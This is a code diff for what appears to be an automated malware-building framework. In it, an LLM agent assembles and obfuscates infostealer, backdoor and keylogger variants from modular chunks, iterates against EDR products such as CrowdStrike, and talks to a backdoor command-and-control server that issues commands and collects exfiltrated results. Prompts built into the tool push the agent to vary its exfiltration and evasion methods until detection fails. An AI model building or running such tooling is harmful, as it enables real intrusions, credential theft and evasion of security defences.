@@ -230,47 +230,168 @@ class _BackdoorC2Handler(BaseHTTPRequestHandler):
 
 
 def _run_backdoor_c2(port: int, timeout: int):
-    _BackdoorC2Handler.test_commands = list(_BACKDOOR_TEST_COMMANDS)
-    _BackdoorC2Handler.test_idx = 0
-    _BackdoorC2Handler.beacon_count = 0
-    _BackdoorC2Handler.results = []
+    """Dual-protocol backdoor C2: tries HTTP first, falls back to raw TCP TLV.
 
+    Accepts the first connection and peeks at the first bytes:
+    - If they start with a valid HTTP method (GET/POST), handle as HTTP (winhttp_beacon)
+    - If they start with TLV binary data, handle as raw TCP (tcp_beacon)
+    """
+    test_commands = list(_BACKDOOR_TEST_COMMANDS)
+    beacon_count = 0
+    result_count = 0
+    results_list: list[dict] = []
+    lock_obj = _c2_locks.get(port)
+
+    def _record(beacons, results, res_list):
+        if lock_obj:
+            with lock_obj:
+                entry = _c2_listeners[port]
+                entry["backdoor_beacons"] = beacons
+                entry["backdoor_result_count"] = results
+                entry["backdoor_results"] = res_list
+
+    def _handle_tcp_tlv(conn: socket.socket):
+        nonlocal beacon_count, result_count, results_list
+        conn.settimeout(15)
+        cmd_idx = 0
+        try:
+            while True:
+                hdr = b""
+                while len(hdr) < 8:
+                    chunk = conn.recv(8 - len(hdr))
+                    if not chunk:
+                        return
+                    hdr += chunk
+                cmd_id, plen = struct.unpack("<II", hdr)
+                payload = b""
+                while len(payload) < plen:
+                    chunk = conn.recv(plen - len(payload))
+                    if not chunk:
+                        return
+                    payload += chunk
+
+                if cmd_id == CMD_HEARTBEAT:
+                    beacon_count += 1
+                    if lock_obj:
+                        with lock_obj:
+                            _c2_listeners[port]["requests"] += 1
+                    if cmd_idx < len(test_commands):
+                        tcmd, targ = test_commands[cmd_idx]
+                        cmd_idx += 1
+                        resp = struct.pack("<II", tcmd, len(targ)) + targ
+                    else:
+                        resp = struct.pack("<II", CMD_NOOP, 0)
+                    conn.sendall(resp)
+                else:
+                    text = payload.decode("utf-8", errors="replace")
+                    result_count += 1
+                    results_list.append({
+                        "cmd": CMD_NAMES.get(cmd_id, f"0x{cmd_id:02x}"),
+                        "size": len(payload),
+                        "preview": text[:500],
+                    })
+                    if lock_obj:
+                        with lock_obj:
+                            entry = _c2_listeners[port]
+                            entry["data"] += hdr + payload
+                            entry["requests"] += 1
+                    if cmd_idx >= len(test_commands) and result_count >= 3:
+                        break
+        except (socket.timeout, OSError) as e:
+            logger.debug("TCP TLV backdoor session ended: %s", e)
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     try:
-        server = _ReusableHTTPServer(("0.0.0.0", port), _BackdoorC2Handler)
+        sock.bind(("0.0.0.0", port))
     except OSError as e:
         logger.error("C2 Backdoor bind failed on port %d: %s — force-killing", port, e)
+        sock.close()
         import subprocess
         subprocess.run(["fuser", "-k", f"{port}/tcp"], capture_output=True, timeout=5)
         time.sleep(1)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         try:
-            server = _ReusableHTTPServer(("0.0.0.0", port), _BackdoorC2Handler)
+            sock.bind(("0.0.0.0", port))
         except OSError as e2:
             logger.error("C2 Backdoor bind retry failed on port %d: %s", port, e2)
+            sock.close()
             _c2_listeners.pop(port, None)
             _c2_locks.pop(port, None)
             return
-    server.timeout = 1
-    _c2_servers[port] = server
+    sock.listen(5)
+    sock.settimeout(1.0)
+    _c2_servers[port] = sock
     stop_event = _c2_stop_events.get(port)
     deadline = time.monotonic() + timeout
+
     while time.monotonic() < deadline:
         if stop_event and stop_event.is_set():
             break
-        server.handle_request()
-        with _BackdoorC2Handler.handler_lock:
-            if (_BackdoorC2Handler.test_idx >= len(_BackdoorC2Handler.test_commands)
-                    and len(_BackdoorC2Handler.results) >= 3):
-                server.handle_request()
-                break
-    server.server_close()
-    _c2_servers.pop(port, None)
+        try:
+            conn, addr = sock.accept()
+            conn.settimeout(5)
+            logger.info("Backdoor C2: connection from %s:%d", addr[0], addr[1])
+        except socket.timeout:
+            continue
+        except OSError:
+            break
 
-    lock = _c2_locks.get(port)
-    if lock:
-        with lock:
-            entry = _c2_listeners[port]
-            entry["backdoor_beacons"] = _BackdoorC2Handler.beacon_count
-            entry["backdoor_result_count"] = len(_BackdoorC2Handler.results)
+        try:
+            peek = conn.recv(8, socket.MSG_PEEK)
+        except (socket.timeout, OSError):
+            conn.close()
+            continue
+
+        if peek and peek[:4] in (b"GET ", b"POST", b"PUT ", b"HEAD"):
+            logger.info("Backdoor C2: HTTP detected, handing off to HTTP handler")
+            conn.close()
+            sock.close()
+            _c2_servers.pop(port, None)
+            _BackdoorC2Handler.test_commands = test_commands
+            _BackdoorC2Handler.test_idx = 0
+            _BackdoorC2Handler.beacon_count = beacon_count
+            _BackdoorC2Handler.results = []
+            try:
+                server = _ReusableHTTPServer(("0.0.0.0", port), _BackdoorC2Handler)
+            except OSError:
+                _record(beacon_count, result_count, results_list)
+                return
+            server.timeout = 1
+            _c2_servers[port] = server
+            remaining = deadline - time.monotonic()
+            while time.monotonic() < deadline:
+                if stop_event and stop_event.is_set():
+                    break
+                server.handle_request()
+                with _BackdoorC2Handler.handler_lock:
+                    if (_BackdoorC2Handler.test_idx >= len(_BackdoorC2Handler.test_commands)
+                            and len(_BackdoorC2Handler.results) >= 3):
+                        server.handle_request()
+                        break
+            server.server_close()
+            _c2_servers.pop(port, None)
+            beacon_count += _BackdoorC2Handler.beacon_count
+            result_count += len(_BackdoorC2Handler.results)
+            for cmd_id, text in _BackdoorC2Handler.results:
+                results_list.append({
+                    "cmd": CMD_NAMES.get(cmd_id, f"0x{cmd_id:02x}"),
+                    "size": len(text),
+                    "preview": text[:500],
+                })
+            _record(beacon_count, result_count, results_list)
+            return
+        else:
+            logger.info("Backdoor C2: raw TCP TLV detected")
+            _handle_tcp_tlv(conn)
+            conn.close()
+            if result_count >= 3:
+                break
+
+    sock.close()
+    _c2_servers.pop(port, None)
+    _record(beacon_count, result_count, results_list)
 
 
 # ── ToolExecutor ─────────────────────────────────────────────────────
@@ -311,16 +432,179 @@ class ToolExecutor:
         self._last_assembled_recipe = ""
         self._last_output_dir = ""
         self._failed_obfusc: set[tuple[str, str]] = set()
+        self._recipe_lineage: dict[str, dict] = {}
+        self._stock_recipes: set[str] = set()
+        self._blind_mode: bool = config.get("blind_mode", False)
+        self._blind_name_map: dict[str, str] = {}
+        self._epoch_call_count = 0
+        self._epoch_number = 1
+        self._epoch_failures: list[str] = []
+        self._epoch_soft_limit = 30
+        self._epoch_hard_limit = 40
+        self._all_epoch_summaries: list[str] = []
+        self._meta_epoch_interval = 10
+        self._quarantine_locked = False
+        self._load_stock_recipes()
+
+    @property
+    def _is_backdoor(self) -> bool:
+        """Detect backdoor mission from config OR recipe name."""
+        if self.config.get("_target_malware_type", "") == "backdoor":
+            return True
+        if self._last_recipe and "backdoor" in self._last_recipe:
+            return True
+        return False
+
+    @property
+    def _is_persistent_type(self) -> bool:
+        """Detect persistent malware types (backdoor, keylogger) from config OR recipe name."""
+        mt = self.config.get("_target_malware_type", "")
+        if mt in ("backdoor", "keylogger"):
+            return True
+        if self._last_recipe and any(k in self._last_recipe for k in ("backdoor", "keylogger", "persist")):
+            return True
+        return False
+
+    @staticmethod
+    def _truncate(text: str, max_chars: int, label: str = "output") -> str:
+        if len(text) <= max_chars:
+            return text
+        half = max_chars // 2
+        removed = len(text) - max_chars
+        return text[:half] + f"\n\n... [{removed} chars truncated from {label}] ...\n\n" + text[-half:]
+
+    @staticmethod
+    def _sanitize_recipe_name(name: str) -> str:
+        import re
+        leak_words = r"_?(proven|fud|working|stealth|pass|bypass|edr|evasion|undetected)"
+        sanitized = re.sub(leak_words, "", name, flags=re.IGNORECASE)
+        sanitized = re.sub(r"_cs(?=_|$)", "", sanitized)
+        sanitized = re.sub(r"_crowdstrike(?=_|$)", "", sanitized)
+        sanitized = re.sub(r"_{2,}", "_", sanitized).strip("_")
+        return sanitized
+
+    def _load_stock_recipes(self):
+        """Snapshot existing recipe names at init — anything here is 'stock'."""
+        recipes_path = Path(self.recipes_dir)
+        if recipes_path.exists():
+            self._stock_recipes = {
+                f.stem for f in recipes_path.glob("*.yaml")
+            }
+
+    def get_recipe_origin(self, recipe_name: str) -> str:
+        """Classify a recipe's origin for success reporting."""
+        name = recipe_name.replace(".yaml", "")
+        lineage = self._recipe_lineage.get(name, {})
+        if not lineage:
+            if name in self._stock_recipes:
+                return "EXISTING — stock recipe with randomization/obfuscation"
+            return "EXISTING — stock recipe with randomization/obfuscation"
+        if lineage.get("created_new"):
+            return "NEW — created from scratch during this campaign"
+        mutation_depth = lineage.get("mutation_depth", 0)
+        parent = lineage.get("original_parent", name)
+        if mutation_depth >= 3:
+            return f"NEW — evolved beyond recognition ({mutation_depth} mutations from {parent})"
+        return f"MUTATED — derived from {parent} ({mutation_depth} mutation{'s' if mutation_depth != 1 else ''})"
+
+    def _build_epoch_reset(self) -> str:
+        """Build an epoch reset message summarizing failures and forcing a new approach."""
+        epoch_summary = []
+        seen = set()
+        for f in self._epoch_failures:
+            if f not in seen:
+                epoch_summary.append(f)
+                seen.add(f)
+
+        summary_lines = [
+            f"\n\n{'='*60}",
+            f"⚠️  EPOCH {self._epoch_number} ENDED — {len(self._epoch_failures)} failed attempts",
+            f"{'='*60}",
+            "",
+            "## What failed this epoch:",
+        ]
+        for f in epoch_summary:
+            summary_lines.append(f"  - {f}")
+
+        self._all_epoch_summaries.append(
+            f"Epoch {self._epoch_number}: {len(self._epoch_failures)} failures — "
+            + "; ".join(epoch_summary[:5])
+        )
+
+        if self._epoch_number > 0 and self._epoch_number % self._meta_epoch_interval == 0:
+            summary_lines.extend([
+                "",
+                f"{'#'*60}",
+                f"## META-REVIEW: {self._epoch_number} epochs completed, still no success",
+                f"{'#'*60}",
+                "",
+                "## Full history of all epochs:",
+            ])
+            for s in self._all_epoch_summaries:
+                summary_lines.append(f"  - {s}")
+            summary_lines.extend([
+                "",
+                "## Decision point — choose ONE:",
+                "1. **GO DEEPER**: Pick the epoch that got CLOSEST to success (most C2 bytes, "
+                "   fewest detections) and refine that specific approach with targeted changes.",
+                "2. **TRY NEW**: If every epoch failed the same way, the problem might be "
+                "   fundamental to your format/type combo. Try a radically different architecture "
+                "   (different exfil protocol, different execution model, different collector set).",
+                "3. **SIMPLIFY**: Strip the recipe to minimum viable (1 collector, basic exfil, "
+                "   no evasion) and verify the skeleton works before adding complexity.",
+                "",
+                "State which option you're choosing and WHY, then act on it.",
+                f"{'#'*60}",
+            ])
+        else:
+            summary_lines.extend([
+                "",
+                "## MANDATORY RESET",
+                "You MUST now take a COMPLETELY DIFFERENT approach:",
+                "- Do NOT mutate any recipe from this epoch",
+                "- Do NOT reuse the same base architecture or evasion combination",
+                "- Call list_chunks again and pick DIFFERENT chunks",
+                "- Try a different arch, different exfil method, different evasion set",
+                "- Create a brand new recipe with create_recipe",
+                f"- This is epoch {self._epoch_number + 1} — make it count",
+            ])
+
+        summary_lines.append(f"{'='*60}")
+        self._epoch_number += 1
+        self._epoch_call_count = 0
+        self._epoch_failures.clear()
+        logger.info("Epoch reset triggered — now epoch %d", self._epoch_number)
+        return "\n".join(summary_lines)
+
+    def _check_epoch_soft_limit(self) -> str:
+        """At the soft limit, nudge the LLM to consider pivoting."""
+        return (
+            f"\n\n--- NOTE: You have made {self._epoch_call_count} tool calls this epoch "
+            f"with {len(self._epoch_failures)} failures. "
+            f"If you're confident your next attempt will work, continue. "
+            f"Otherwise, consider summarizing what failed and trying a completely "
+            f"different approach (different arch, exfil, evasion combination). "
+            f"Hard reset in {self._epoch_hard_limit - self._epoch_call_count} calls. ---"
+        )
 
     async def execute(self, tool_name: str, arguments: dict) -> str:
         handler = getattr(self, f"tool_{tool_name}", None)
         if handler is None:
             return f"ERROR: Unknown tool '{tool_name}'"
         try:
-            return await handler(**arguments)
+            result = await handler(**arguments)
         except Exception as e:
             logger.exception("Tool %s failed", tool_name)
-            return f"ERROR: {tool_name} failed: {e}"
+            result = f"ERROR: {tool_name} failed: {e}"
+
+        self._epoch_call_count += 1
+
+        if self._epoch_call_count >= self._epoch_hard_limit:
+            result += self._build_epoch_reset()
+        elif self._epoch_call_count == self._epoch_soft_limit:
+            result += self._check_epoch_soft_limit()
+
+        return result
 
     # ── SSH / SCP helpers ────────────────────────────────────────────
 
@@ -509,6 +793,8 @@ class ToolExecutor:
 
     def _load_recipe_results(self) -> dict[str, list[dict]]:
         """Load recipe_results.json and index by recipe name."""
+        if self._blind_mode:
+            return {}
         rr_path = Path(self.recipes_dir).parent.parent.parent / "results" / "recipe_results.json"
         by_recipe: dict[str, list[dict]] = {}
         try:
@@ -520,89 +806,167 @@ class ToolExecutor:
             pass
         return by_recipe
 
-    async def tool_list_recipes(self, format_filter: str = "") -> str:
-        logger.info("Listing recipes (filter=%s)", format_filter or "all")
+    async def tool_list_recipes(self, format_filter: str = "", type_filter: str = "") -> str:
+        logger.info("Listing recipes (format=%s, type=%s)", format_filter or "all", type_filter or "all")
+
+        if self._blind_mode:
+            return ("BLIND MODE: Recipe list is not available. "
+                    "Use list_chunks to discover available chunks, then create_recipe to build your own.\n\n"
+                    "Recipe structure reference:\n"
+                    "  core: [core/emit_buffer, core/run_cmd, core/file_ops]\n"
+                    "  collectors: [collectors/<name>, ...]\n"
+                    "  exfil: exfil/<method>\n"
+                    "  arch: arch/<style>\n"
+                    "  evasion: [evasion/<technique>, ...]\n"
+                    "  vars: {C2_IP: <ip>, C2_PORT: <port>}")
+
         recipes_path = Path(self.recipes_dir)
         if not recipes_path.exists():
             return "ERROR: Recipes directory not found"
 
+        type_prefixes = {
+            "infostealer": ("infostealer_", "js_infostealer_", "bat_infostealer_", "vbs_infostealer_"),
+            "backdoor": ("backdoor_", "js_backdoor_", "bat_backdoor_", "vbs_backdoor_"),
+            "keylogger": ("keylogger_", "js_keylogger_", "bat_keylogger_", "vbs_keylogger_"),
+        }
+
         recipe_history = self._load_recipe_results()
         results = []
+        script_formats = {"jscript", "vbscript", "batch"}
         for yf in sorted(recipes_path.glob("*.yaml")):
             name = yf.stem
-            if format_filter:
-                if format_filter == "jscript":
-                    if not name.startswith("js_"):
-                        with open(yf) as fh:
-                            data = yaml.safe_load(fh)
-                        if data.get("format") != "jscript":
-                            continue
-                elif format_filter == "c":
-                    if name.startswith("js_"):
+
+            if type_filter and type_filter in type_prefixes:
+                if not any(name.startswith(p) for p in type_prefixes[type_filter]):
+                    continue
+
+            if format_filter and format_filter != "auto":
+                with open(yf) as fh:
+                    data = yaml.safe_load(fh)
+                recipe_fmt = data.get("format", "")
+                if format_filter in script_formats:
+                    if recipe_fmt != format_filter:
                         continue
-                    with open(yf) as fh:
-                        data = yaml.safe_load(fh)
-                    if data.get("format") == "jscript":
+                elif format_filter in ("pe", "c"):
+                    if recipe_fmt in script_formats:
                         continue
 
+            display_name = name
             history = recipe_history.get(name, [])
             if history:
                 latest = history[-1]
                 tag = f" [{latest['verdict']}@{latest.get('edr','?')}]"
             else:
                 tag = ""
-            results.append(f"{name}{tag}")
+            results.append(f"{display_name}{tag}")
 
         header = f"Recipes ({len(results)})"
         if recipe_history:
             passes = sum(1 for recs in recipe_history.values() for r in recs if r["verdict"] == "PASS")
             fails = sum(1 for recs in recipe_history.values() for r in recs if "FAIL" in r["verdict"])
             header += f" — {passes} proven PASS, {fails} known FAIL"
-        return f"{header}:\n" + "\n".join(f"  - {r}" for r in results)
+        output = f"{header}:\n" + "\n".join(f"  - {r}" for r in results)
+        return self._truncate(output, 2000, "list_recipes")
 
-    async def tool_list_chunks(self, category: str) -> str:
-        logger.info("Listing chunks in %s", category)
+    @staticmethod
+    def _parse_chunk_meta(filepath: Path) -> dict:
+        """Extract provides/depends/note from chunk header comments."""
+        meta = {}
+        comment_chars = {"//": (".c", ".h", ".js"), "'": (".vbs",), "REM": (".bat",)}
+        prefix = None
+        for chars, exts in comment_chars.items():
+            if filepath.suffix in exts:
+                prefix = chars
+                break
+        if not prefix:
+            return meta
+        try:
+            with open(filepath, "r", errors="ignore") as f:
+                for line in f:
+                    line = line.strip()
+                    if not line.startswith(prefix):
+                        break
+                    rest = line[len(prefix):].strip()
+                    for key in ("provides:", "depends:", "note:", "description:"):
+                        if rest.lower().startswith(key):
+                            val = rest[len(key):].strip()
+                            meta[key.rstrip(":")] = val
+                            break
+        except OSError:
+            pass
+        return meta
+
+    async def tool_list_chunks(self, category: str, format_filter: str = "") -> str:
+        logger.info("Listing chunks in %s (format=%s)", category, format_filter or "all")
+
+        fmt_dir = ""
+        if format_filter:
+            fmt_map = {"jscript": "jscript", "vbscript": "vbscript", "batch": "batch",
+                       "pe": "", "c": "", "auto": ""}
+            fmt_dir = fmt_map.get(format_filter, "")
+
+        def _list_cat(cat_path: Path) -> list[str]:
+            entries = []
+            for entry in sorted(cat_path.iterdir()):
+                if entry.is_file() and entry.suffix in (".c", ".h", ".js", ".vbs", ".bat"):
+                    ref = f"{cat_path.name}/{entry.stem}"
+                    meta = self._parse_chunk_meta(entry)
+                    desc = meta.get("note") or meta.get("description") or ""
+                    provides = meta.get("provides", "")
+                    parts = [f"  - {ref}"]
+                    if provides:
+                        parts.append(f"[provides: {provides}]")
+                    if desc:
+                        parts.append(f"— {desc[:80]}")
+                    entries.append(" ".join(parts))
+            return entries
 
         if category == "all":
+            base = Path(self.chunks_dir) / fmt_dir if fmt_dir else Path(self.chunks_dir)
             lines = []
             total = 0
-            for cat_path in sorted(Path(self.chunks_dir).iterdir()):
+            for cat_path in sorted(base.iterdir()):
                 if not cat_path.is_dir() or cat_path.name.startswith(".") or cat_path.name in ("recipes", "__pycache__"):
                     continue
-                chunks = []
-                for entry in sorted(cat_path.iterdir()):
-                    if entry.is_file() and entry.suffix in (".c", ".h", ".js", ".vbs", ".bat"):
-                        chunks.append(f"{cat_path.name}/{entry.stem}")
-                if chunks:
-                    total += len(chunks)
-                    lines.append(f"\n{cat_path.name} ({len(chunks)}):")
-                    for c in chunks:
-                        lines.append(f"  - {c}")
-            return (f"All chunks ({total}):" + "\n".join(lines)
-                    + "\n\nALWAYS use 'category/name' format in recipes.")
+                entries = _list_cat(cat_path)
+                if entries:
+                    total += len(entries)
+                    lines.append(f"\n{cat_path.name} ({len(entries)}):")
+                    lines.extend(entries)
+            output = (f"All chunks ({total})"
+                     + (f" for {format_filter}" if format_filter else "")
+                     + ":" + "\n".join(lines)
+                     + "\n\nALWAYS use 'category/name' format in recipes.")
+            return self._truncate(output, 6000, "list_chunks")
 
-        cat_path = Path(self.chunks_dir) / category
+        base = Path(self.chunks_dir) / fmt_dir if fmt_dir else Path(self.chunks_dir)
+        cat_path = base / category
         if not cat_path.exists():
-            cats = sorted(p.name for p in Path(self.chunks_dir).iterdir()
+            cats = sorted(p.name for p in base.iterdir()
                          if p.is_dir() and not p.name.startswith(".") and p.name not in ("recipes", "__pycache__"))
             return f"ERROR: Category '{category}' not found. Available: {', '.join(cats)}"
 
-        chunks = []
-        for entry in sorted(cat_path.iterdir()):
-            if entry.is_file() and entry.suffix in (".c", ".h", ".js", ".vbs", ".bat"):
-                chunks.append(f"{category}/{entry.stem}")
-
-        return (f"Chunks in {category} ({len(chunks)}):\n"
-                + "\n".join(f"  - {c}" for c in chunks)
-                + f"\n\nALWAYS use the full 'category/name' format in recipes.")
+        entries = _list_cat(cat_path)
+        output = (f"Chunks in {category} ({len(entries)})"
+                  + (f" for {format_filter}" if format_filter else "")
+                  + ":\n" + "\n".join(entries)
+                  + f"\n\nALWAYS use the full 'category/name' format in recipes.")
+        return self._truncate(output, 6000, "list_chunks")
 
     async def tool_get_strategy(self, edr: str) -> str:
         logger.info("Getting strategy for EDR: %s", edr)
+        if self._blind_mode:
+            return (f"Strategy for {edr}:\n\nBLIND MODE: No pre-built strategy available. "
+                    "Use list_chunks to see evasion options, pick a recipe, and iterate based on results.")
         tree = StrategyTree()
         return tree.summary(edr)
 
     async def tool_query_knowledge(self, edr: str, malware_type: str = "") -> str:
         logger.info("Querying knowledge for %s / %s", edr, malware_type or "all")
+        if self._blind_mode:
+            return (f"Knowledge DB -- {edr}" + (f" / {malware_type}" if malware_type else "") +
+                    "\n\nBLIND MODE: No prior results available. "
+                    "You must discover working recipes from scratch using available chunks and evasion techniques.")
         db = KnowledgeDB.load()
         lines = [f"Knowledge DB -- {edr}" + (f" / {malware_type}" if malware_type else "")]
 
@@ -767,7 +1131,9 @@ class ToolExecutor:
                             vars: dict | None = None,
                             randomize: bool = False,
                             obfuscation: str = "light",
-                            compiler: str = "mingw") -> str:
+                            compiler: str = "mingw",
+                            count: int = 1) -> str:
+        count = max(1, min(count, 10))
         edr = self.config.get("edr", "none").lower()
         if edr != "none":
             if not randomize:
@@ -776,13 +1142,32 @@ class ToolExecutor:
             if obfuscation == "none":
                 logger.info("EDR target (%s): forcing obfuscation=light", edr)
                 obfuscation = "light"
+
+        if count > 1:
+            import time
+            results = []
+            for i in range(count):
+                r = await self.tool_assemble(
+                    recipe=recipe, compile=compile, vars=vars,
+                    randomize=randomize, obfuscation=obfuscation,
+                    compiler=compiler, count=1,
+                )
+                results.append(f"--- Variant {i+1}/{count} ---\n{r}")
+                if i < count - 1:
+                    time.sleep(1)
+            return self._truncate("\n\n".join(results), 3000, "assemble")
+
         logger.info("Assembling recipe: %s (compile=%s, randomize=%s, obfuscation=%s)",
                      recipe, compile, randomize, obfuscation)
         self._last_recipe = recipe.replace(".yaml", "")
         self._last_assembled_recipe = self._last_recipe
         self._quarantine_streak = 0
+        self._quarantine_locked = False
 
-        recipe_file = recipe if recipe.endswith(".yaml") else f"{recipe}.yaml"
+        recipe_name = recipe.replace(".yaml", "")
+        if self._blind_mode and recipe_name in self._blind_name_map:
+            recipe_name = self._blind_name_map[recipe_name]
+        recipe_file = f"{recipe_name}.yaml"
         recipe_path = Path(self.recipes_dir) / recipe_file
         if not recipe_path.exists():
             return f"ERROR: Recipe not found: {recipe_path}"
@@ -800,6 +1185,20 @@ class ToolExecutor:
                 return (f"WARNING: Recipe '{recipe}' does not appear to be a {target_type}. "
                         f"The user selected malware type '{target_type}'. "
                         f"Use a {target_type} recipe instead, or call list_recipes to find one.")
+
+        target_format = self.config.get("_target_format", "")
+        recipe_fmt = recipe_data.get("format", "")
+        script_formats = {"jscript", "vbscript", "batch"}
+        if target_format and target_format not in ("auto", ""):
+            fmt_mismatch = False
+            if target_format in script_formats:
+                fmt_mismatch = recipe_fmt != target_format
+            elif target_format in ("pe", "c"):
+                fmt_mismatch = recipe_fmt in script_formats
+            if fmt_mismatch:
+                return (f"ERROR: Recipe '{recipe}' is format '{recipe_fmt or 'pe'}' "
+                        f"but the user required format '{target_format}'. "
+                        f"Call list_recipes(format_filter=\"{target_format}\") to find matching recipes.")
 
         self._last_exfil = recipe_data.get("exfil", "")
         is_jscript = recipe_data.get("format") == "jscript" or recipe.startswith("js_")
@@ -856,7 +1255,19 @@ class ToolExecutor:
         err = stderr.decode("utf-8", errors="replace")
 
         if proc.returncode != 0:
-            return f"ERROR: Assembly failed (rc={proc.returncode})\nstdout: {out}\nstderr: {err}"
+            import re
+            chunk_miss = re.search(r"Chunk not found: (\S+)", err)
+            if chunk_miss:
+                bad_chunk = chunk_miss.group(1)
+                detail = (f"ERROR: Chunk '{bad_chunk}' does not exist. "
+                          f"Use list_chunks to see valid chunk names — do NOT guess. "
+                          f"Fix the recipe (mutate_recipe with remove_evasion=['{bad_chunk}']) "
+                          f"and replace with a real chunk from list_chunks output.")
+            else:
+                detail = f"ERROR: Assembly failed (rc={proc.returncode})\nstdout: {out[:500]}\nstderr: {err[:500]}"
+            self._epoch_failures.append(
+                f"Assembly failed for {recipe_key}: {err[:200] if err else out[:200]}")
+            return detail
 
         obfusc_note = ""
         pre_obfusc_source = None
@@ -941,22 +1352,27 @@ class ToolExecutor:
 
         output_files = list(result_dir.iterdir())
         output_summary = ", ".join(f.name for f in output_files)
+        recipe_key = recipe.replace(".yaml", "")
+        origin = self.get_recipe_origin(recipe_key)
 
         if not is_jscript and compile and binary:
             size = binary.stat().st_size
             return (f"Assembled and compiled: {binary} ({size} bytes)\n"
                     f"Output dir: {result_dir}\n"
-                    f"Files: {output_summary}\n{out}{obfusc_note}")
+                    f"Files: {output_summary}\n"
+                    f"Recipe origin: {origin}\n{out}{obfusc_note}")
 
         if is_jscript:
             size = os.path.getsize(output_source) if os.path.exists(output_source) else 0
             return (f"Assembled JScript: {output_source} ({size} bytes)\n"
                     f"Output dir: {result_dir}\n"
-                    f"Files: {output_summary}\n{out}")
+                    f"Files: {output_summary}\n"
+                    f"Recipe origin: {origin}\n{out}")
 
         return (f"Assembled source: {output_source}\n"
                 f"Output dir: {result_dir}\n"
-                f"Files: {output_summary}\n{out}\n{err}{obfusc_note}")
+                f"Files: {output_summary}\n"
+                f"Recipe origin: {origin}\n{out}\n{err}{obfusc_note}")
 
     async def tool_create_recipe(
         self,
@@ -981,11 +1397,15 @@ class ToolExecutor:
                 format_errors.append(ref)
             else:
                 chunk_path = Path(self.chunks_dir) / ref
-                if not (chunk_path.with_suffix(".c").exists() or
-                        chunk_path.with_suffix(".h").exists() or
-                        chunk_path.with_suffix(".js").exists() or
-                        chunk_path.with_suffix(".vbs").exists() or
-                        chunk_path.with_suffix(".bat").exists()):
+                fmt_prefixes = {"jscript": "jscript", "vbscript": "vbscript", "batch": "batch"}
+                fmt_dir = fmt_prefixes.get(format_type, "")
+                fmt_chunk_path = Path(self.chunks_dir) / fmt_dir / ref if fmt_dir else None
+                found = False
+                for p in [chunk_path, fmt_chunk_path]:
+                    if p and any(p.with_suffix(s).exists() for s in (".c", ".h", ".js", ".vbs", ".bat")):
+                        found = True
+                        break
+                if not found:
                     missing_errors.append(ref)
         if format_errors:
             return (f"ERROR: Chunk references must use 'category/name' format.\n"
@@ -993,18 +1413,43 @@ class ToolExecutor:
                     f"Example: use 'evasion/stack_spoof' not 'stack_spoof', "
                     f"'collectors/system_info' not 'system_info'.")
         if missing_errors:
-            cats = sorted(set(p.name for p in Path(self.chunks_dir).iterdir()
-                            if p.is_dir() and not p.name.startswith(".") and p.name not in ("recipes", "__pycache__")))
+            suggestions = {}
+            for bad_ref in missing_errors:
+                cat, chunk_name = bad_ref.split("/", 1) if "/" in bad_ref else ("", bad_ref)
+                search_dirs = []
+                if cat:
+                    search_dirs.append(Path(self.chunks_dir) / cat)
+                    fmt_prefix = {"jscript": "jscript", "vbscript": "vbscript", "batch": "batch"}.get(format_type)
+                    if fmt_prefix:
+                        search_dirs.append(Path(self.chunks_dir) / fmt_prefix / cat)
+                available = []
+                for cat_path in search_dirs:
+                    if cat_path.is_dir():
+                        available.extend(f.stem for f in cat_path.iterdir()
+                                         if f.is_file() and f.suffix in (".c", ".h", ".js", ".vbs", ".bat"))
+                available = sorted(set(available))
+                if available:
+                    matches = [a for a in available if chunk_name in a or a in chunk_name
+                               or chunk_name.replace("_", "") == a.replace("_", "")]
+                    if not matches:
+                        matches = sorted(available, key=lambda a: sum(
+                            1 for c in chunk_name if c in a))[-3:]
+                    if matches:
+                        suggestions[bad_ref] = [f"{cat}/{m}" for m in matches[:3]]
+            hint_lines = []
+            for bad, suggs in suggestions.items():
+                hint_lines.append(f"  {bad} → did you mean: {', '.join(suggs)}?")
             return (f"ERROR: Chunks not found on disk: {', '.join(missing_errors)}\n"
-                    f"Available categories: {', '.join(cats)}\n"
-                    f"Use list_chunks with the correct category to see available chunks.")
+                    + ("\n".join(hint_lines) + "\n" if hint_lines else "")
+                    + "Use list_chunks with the correct category to see available chunks.\n"
+                    + "TIP: Use an EXISTING recipe with assemble(randomize=True) instead of creating from scratch.")
 
         recipe = {
             "name": name,
             "description": f"Auto-generated recipe by Hermes ({format_type})",
         }
-        if format_type == "jscript":
-            recipe["format"] = "jscript"
+        if format_type in ("jscript", "vbscript", "batch"):
+            recipe["format"] = format_type
 
         recipe["core"] = ["core/emit_buffer", "core/run_cmd", "core/file_ops"]
         recipe["collectors"] = collectors
@@ -1031,7 +1476,13 @@ class ToolExecutor:
         self._last_exfil = exfil
         logger.info("Set _last_recipe=%s, _last_exfil=%s from create_recipe", name, exfil)
 
-        return f"Created recipe: {out_path}"
+        self._recipe_lineage[name] = {
+            "original_parent": name,
+            "mutation_depth": 0,
+            "created_new": True,
+        }
+
+        return f"Created recipe: {out_path}\nOrigin: NEW — created from scratch during this campaign"
 
     async def tool_mutate_recipe(
         self,
@@ -1040,10 +1491,14 @@ class ToolExecutor:
         remove_evasion: list[str] | None = None,
         swap_exfil: str | None = None,
         swap_arch: str | None = None,
+        swap_api_resolve: str | None = None,
         set_resources: bool | None = None,
         new_name: str | None = None,
     ) -> str:
-        recipe_file = recipe if recipe.endswith(".yaml") else f"{recipe}.yaml"
+        recipe_name = recipe.replace(".yaml", "")
+        if self._blind_mode and recipe_name in self._blind_name_map:
+            recipe_name = self._blind_name_map[recipe_name]
+        recipe_file = f"{recipe_name}.yaml"
         recipe_path = Path(self.recipes_dir) / recipe_file
         if not recipe_path.exists():
             return f"ERROR: Recipe not found: {recipe_path}"
@@ -1077,6 +1532,10 @@ class ToolExecutor:
             data["arch"] = swap_arch
             changes.append(f"swapped arch -> {swap_arch}")
 
+        if swap_api_resolve:
+            data["api_resolve"] = swap_api_resolve
+            changes.append(f"swapped api_resolve -> {swap_api_resolve}")
+
         if set_resources is not None:
             data["resources"] = set_resources
             changes.append(f"resources = {set_resources}")
@@ -1092,7 +1551,18 @@ class ToolExecutor:
         self._last_exfil = data.get("exfil", "")
